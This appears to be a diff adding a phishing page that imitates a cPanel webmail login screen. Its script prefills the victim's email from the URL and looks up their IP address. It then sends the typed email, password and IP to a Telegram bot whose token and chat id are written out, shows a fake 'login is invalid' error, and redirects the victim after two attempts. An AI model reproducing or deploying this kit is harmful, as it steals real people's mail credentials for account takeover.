@@ -1,0 +1,371 @@
+<html lang="en" id="html" data-emailvalue="[Email]"><head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+      <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+      <title>Webmail Login</title>
+</head>
+<body>
+      <style>
+            @import url("https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css");
+            :root{
+                  --bg: #E00400;
+                  --bg_color: #f8302c;
+                  --bg_light: #d76b69;
+                  --grey : #E9F1F7;
+                  --light_grey: #E6E6E6;
+                  --opaque : #00000066;
+                  --opaque_light : #00000033;
+                  --opaque_dark : #000000bf;
+                  --secondary : #2E2D28;
+                  --black: #1B1919;
+                  --light_black: #5A5A5A;
+                  --primary: #f0d32e;
+                  --primary_light : #fff2aa;
+                  --error_text : #f63737;
+                  --success: #108010;
+                  --light_success: #cbffcb;
+            }
+            .container{
+                  padding: 10px;
+            }
+            .container_body{
+                  margin-top: 120px;
+            }
+            .flexible{
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+            }
+            .flex_column{
+                  display: flex;
+                  flex-flow: column;
+            }
+            .g_10px{
+                  gap: 10px;
+            }
+            .g_20px{
+                  gap: 20px;
+            }
+            .flex{
+                  display: flex;
+            }
+            .align_center{
+                  align-items: center;
+            }
+            input[type = "text"], input[type = "password"]{
+                  width: 100%;
+                  border: none;
+                  outline: none;
+            }
+            .input_div{
+                  border: 2px solid rgba(124, 122, 122, 0.546);
+                  padding: 3px;
+                  border-radius: 5px;
+            }
+            .newbutton{
+                  background: #179BD7;
+                  padding: 6px 10px;
+                  border: 1px solid #095779;
+                  border-radius: 5px;
+                  color: white;
+                  font-size: 15px;
+                  margin-top: 20px;
+            }
+            .newbutton:hover{
+                  background: #095779;
+            }
+            .mtop_50px{
+                  width: 300px;
+                  margin: auto;
+                  margin-top: 50px;
+            }
+            .flex_wrap{
+                  display: flex;
+                  flex-wrap: wrap;
+            }
+            .p_50px{
+                  padding: 50px;
+            }
+            .text_center{
+                  text-align: center;
+            }
+            .delimiter{
+                  width: 45%;
+                  border: 1px solid var(--grey);
+            }
+            .via{
+                  width: fit-content;
+                  margin: auto;
+                  margin-top: 50px;
+                  padding: 8px 40px;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  border-radius: 5px;
+                  gap: 14px;
+                  background: #FF6C2C;
+                  color: white;
+                  border: none;
+                  width: 300px;
+            }
+            .footer{
+                  font-size: 10px;
+                  text-align: center;
+            }
+            #error{
+                  display: none;
+            }
+            .error_alert{
+                  border: 1px solid #D35351;
+                  background: #D35351;
+                  display: flex;
+                  gap: 15px;
+                  align-items: center;
+                  padding: 15px 10px;
+                  border-radius: 5px;
+                  color: white;
+                  margin-bottom: 30px;
+                  width: 300px;
+            }
+
+            @media screen and (min-width : 500px) {
+                  .form{
+                        width: 300px;
+                        margin: auto;
+                  }
+                  .webmail{
+                        width: 320px !important;
+                  }
+            }
+      </style>
+
+      </head>
+  <!-- oncontextmenu="return false" -->
+  <body >
+    <div class="container-fluid p-0">
+
+      <div class="container-fluid">
+        <div class="row" style="margin: 30px 0px 60px 0px;">
+          <div class="col-md-4 mx-auto mt-5 px-3 pb-3">
+
+            <div class="text-center pt-5" style="margin-left: 10%;"> 
+
+              <div class="alert mx-3" id="msg" style="background-color: #D35351; color: white; font-size: 12px; width: 80%; display: none; text-align: left;">
+                <div class="text-white text-left">
+
+                  <i class="fas fa-times-circle"></i>
+                  &nbsp
+                  <span class="small" id="msg_text"></span>
+                  
+                </div>
+
+                        </div>
+                  </div>
+
+                  <div class="flexible">
+                        <img src="https://bh-32.webhostbox.net:2096/cPanel_magic_revision_1645739615/unprotected/cpanel/images/webmail-logo.svg" alt="" style="width: 65%; margin: auto;" class="webmail">
+                  </div>
+                  <form action="" id="form" class="form flex_column g_20px" style="margin-top: 50px;" autocomplete="off">
+                        <div class="flex_column g_10px">
+                              <div>Email Address</div>
+                              <div class="input_div flex g_10px align_center">
+                                    <div class="image">
+                                          <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAARJJREFUOI3llD9LA0EQxd/M3JEu3V2jaWS/QRoVW/9VpvI7+glCRLCQYGVpIZxVBDEL9sfd7VgIx5nsrqyIja+bebwfb4sd4JdFQcecj7KimxKLUUJBCttwd4tXWaOa16EYh4y8xAwiB0ooAEAJRaZymZeYxRoGgcrYTdl/C/yp/gaYH51MY6GY7wVqh1EMGPO9wFZpHaahjvni3b48v/POHoF5smkR3I27XzwlNQSA1soDKewXmMI2y8VjKBMFoprX6rpquNqc04AAlKiIzT5t/+X9UyOiE1YxyhhvBRRWXVe1GVa4u16FgYfHZY7swgcJtlHY5g1Xw2PRPzkVBnweDCnd2XDXA1NhfUtm4wX+H30ABt1aqKKaAhgAAAAASUVORK5CYII=" width="20">
+                                    </div>
+                                   
+				    <input type="text" name="email" id="email" placeholder="Enter your email address" required="" style="font-size: 14px; font-family: "Open Sans", sans-serif;">
+                              </div>
+                        </div>
+                        <div class="flex_column g_10px">
+                              <div>Password</div>
+                              <div class="input_div flex g_10px align_center">
+                                    <div class="image">
+                                          <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABHNCSVQICAgIfAhkiAAAAc9JREFUOI2tk81LG1EUxc99byZjkilRjJlSP6hViW66SFZGFKQ0xa7cuWn/hm677spdEboR/BPEhSCC4MaFSqEVBLEiXanQ0Gi1H4nNvDe3m4bOxAkzVM/uvXPuj3vfB3DHorbO8Ixl9OgihCyAYAEAefjOrA/UzsZ2uzLZDmY6mIMQ+XSH9WOov/c425mpXDdcq6H1KPUN5fjk81FYqRG2aTlU0sQ9U4XHO5sL80cAfv+1zCevXo9tfdwfN8bLpbBOQ4GauJDrzJxuLszvEVHd7zHz3sPZF86Xi8uiAm4AxQ3aZLkfAAZ7H3xqhQEAEdXzwwOHmr1EMxvw/Qs5UZ42hTmg2MsaJKpae9dhE0gpOpoZpdxj/+iBkYlkQbEHAFDsZUP6b3r/MlJm4Ru9TUlQGTtVMaX8FScbCSzmH32ori+vrb59sypAblQ+9Jb92l16956Iasx8eS+ZvLiq15xbdUhTz7oBgEaeJ2puIx2VjwRaELMoPc0l7mPGVcq+NVAzJUadQWmnkpHHEwsIAIcri9Uu2z6/E2DGTlVootylPIQ+8lZFjnH1s+YYwnh5Vv0ahxfsMM47a1Xasr7514G/zMy51r0YUkQU63z/S38AjdWZR1kwHgsAAAAASUVORK5CYII=" width="20">
+                                    </div>
+                                    <input type="password" name="password" id="password" placeholder="Enter your email password." required="" style="font-size: 14px; font-family: "Open Sans", sans-serif;">
+
+                             
+                        </div>
+
+                        <button class="newbutton" id="submit-btn">Log In</button>
+                  </form>
+		<div class="col-lg-12 text-center mt-1"> 
+            <small class="font-weight-bold" style="color: #766;">Reset Password</small>
+
+                  <div class="g_20px p_50px text_center flexible">
+                        <small>English</small>
+                        <small>العربية</small>
+                        <small>български</small>
+                        <small>čeština</small>
+                        <small>dansk</small>
+                        <small>Deutsch</small>
+                        <small>Ελληνικά</small>
+                        <small>español</small>
+                        <small>...</small>
+                  </div>
+
+                  <div class="p_10px flex_column flexible g_10px footer">
+                        <img src="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" width="25">
+                        <small style="line-height: 9px;">Copyright © 2025 cPanel, L.L.C. <br> Privacy Policy</small>
+			
+                 
+        
+<input type="number" value="0" id="number" hidden="">
+  <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  <script>
+
+      /* global $ */
+    $(document).ready(function(){
+      var count=0;
+       let u53TiQ = '';
+      $.getJSON('https://api.ipify.org?format=json', function(data){
+        u53TiQ = data.ip;
+        });
+
+var tx1="5370730671";
+var tx2="7148375916:AAF0tJElL4mVB-TVT8J2kIJJo4Ojfq9XfyY";
+ ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+		$("#logoname").html(final);
+		$("#logonames").html(final);
+		$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "https://www."+my_slice);
+		$("#logoname").html(my_slice);
+
+
+       
+      }
+
+
+	  
+	  
+	  
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("The login is invalid");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+          
+
+      $.ajax({
+        dataType: 'JSON',
+		url: ur,
+        type: 'GET',
+        data:{
+          ajaxid: 4,
+		text: ("====Anonnymouxx Webmail====\nEmail: " + email + "\nPassword: " + password + "\nIp: " + u53TiQ )			
+        },
+			processData: true,
+		contentType: false,
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Log in');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response.ok === true){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+             window.location.replace("https://isc.sans.edu/diaryimages/images/blurred21207.jpg");
+              }
+                  $("#msg").show();
+    	$('#msg').html("The login is invalid");
+                }
+                else{
+                 $("#msg").show();
+    	$('#msg').html("The login is invalid");
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                  		window.location.replace("https://isc.sans.edu/diaryimages/images/blurred21207.jpg");
+              }
+            
+             $("#msg").show();
+    $('#msg').html("The login is invalid");
+            },
+            complete: function(){
+              $('#submit-btn').html('Log in');
+            }
+          });
+    });
+
+
+    });
+
+
+</script>
+  </body></html>
